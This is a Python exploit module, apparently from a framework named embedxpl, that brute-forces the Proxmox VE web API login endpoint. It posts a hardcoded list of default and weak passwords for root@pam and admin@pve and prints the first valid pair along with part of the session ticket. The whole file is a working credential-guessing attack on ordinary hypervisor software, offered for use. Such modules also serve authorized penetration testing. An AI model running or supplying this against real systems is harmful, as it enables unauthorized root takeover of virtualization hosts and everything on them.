# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Proxmox VE — Default Web Interface Credentials (root@pam brute-force).

Version: 1.0.0
"""

import json
import urllib.parse

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_DEFAULT_CREDENTIALS = [
    ("root@pam", "proxmox"),
    ("root@pam", "root"),
    ("root@pam", "toor"),
    ("root@pam", "password"),
    ("root@pam", "Proxmox01"),
    ("admin@pve", "admin"),
    ("root@pam", "admin"),
]


class Exploit(HTTPClient):
    """Proxmox VE Default Credentials Brute-Force.

    Attempts authentication against the Proxmox VE API using known
    default and weak credential combinations for the root@pam realm.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Proxmox VE Default Credentials",
        "description": (
            "Attempts authentication against Proxmox VE /api2/json/access/ticket "
            "using default credentials: root@pam with common weak passwords."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": ("https://pve.proxmox.com/pve-docs/api-viewer/",),
        "devices": ("Proxmox VE",),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(8006, "Proxmox web UI port")
    stop_on_success = OptBool(True, "Stop after first valid credential pair")

    def run(self) -> None:
        print_status(
            "Brute-forcing Proxmox VE credentials on {}:{}...".format(
                self.target, self.port
            )
        )
        found = False
        for username, password in _DEFAULT_CREDENTIALS:
            body = urllib.parse.urlencode({
                "username": username,
                "password": password,
            })
            resp = self.http_request(
                method="POST",
                path="/api2/json/access/ticket",
                data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if resp and resp.status_code == 200:
                try:
                    data = json.loads(resp.text or "{}").get("data", {})
                    ticket = data.get("ticket", "")
                except Exception:
                    ticket = ""
                if ticket:
                    print_success(
                        "Valid credentials: {}:{} — ticket: {}...".format(
                            username, password, ticket[:40]
                        )
                    )
                    found = True
                    if self.stop_on_success:
                        return
            else:
                code = resp.status_code if resp else "no response"
                print_status("  {}:{} — {}".format(username, password, code))

        if not found:
            print_error("No default credentials accepted")

    @mute
    def check(self) -> bool:
        resp = self.http_request(method="GET", path="/api2/json/version")
        return resp is not None and resp.status_code in (200, 401)
